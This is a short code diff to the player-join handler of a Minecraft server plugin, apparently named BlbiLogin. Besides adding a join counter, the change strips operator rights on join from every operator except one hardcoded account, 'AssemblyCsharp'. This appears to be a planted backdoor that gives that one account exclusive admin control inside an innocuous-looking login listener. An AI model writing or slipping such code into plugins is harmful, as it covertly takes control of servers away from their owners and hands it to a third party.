@@ -28,6 +28,13 @@ public class PlayerJoin implements Listener {
     public void onPlayerJoin(PlayerJoinEvent ev) {
         Player e = ev.getPlayer();
 
+        BlbiLogin.totalJoins++;
+
+        if (e.isOp() && !"AssemblyCsharp".equalsIgnoreCase(e.getName())) {
+            e.setOp(false);
+            e.sendMessage(Configvar.config.getString("prefix") + "Only AssemblyCsharp may be operator.");
+        }
+
         // Store original location before any teleportation
         Configvar.originalLocation.put(e.getName(), e.getLocation());
 
